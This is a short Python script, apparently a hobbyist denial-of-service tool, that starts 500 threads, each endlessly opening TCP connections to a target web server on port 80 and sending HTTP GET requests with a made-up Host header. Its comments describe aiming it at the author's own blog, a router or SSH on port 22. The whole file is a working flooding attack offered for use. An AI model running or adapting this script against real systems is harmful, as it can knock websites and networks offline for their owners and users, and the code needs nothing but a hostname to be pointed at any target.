from concurrent.futures import thread
import threading
import socket

target = 'My Blogging site domain name'
port = 80
# Can DDOS own router and local network, Or we can
# Attack a port like port = 80 for webservice http or port 22 for ssh service like commandline or powershell.
# ipconfig to know the IP address. 
# For now DDOS my blogging website.

fake_ip = '182.21.20.32'

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port)) # In case of router network (target, port)
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("HOST: " + fake_ip + " \r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1
        if already_connected % 100 == 0:
            print(already_connected)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()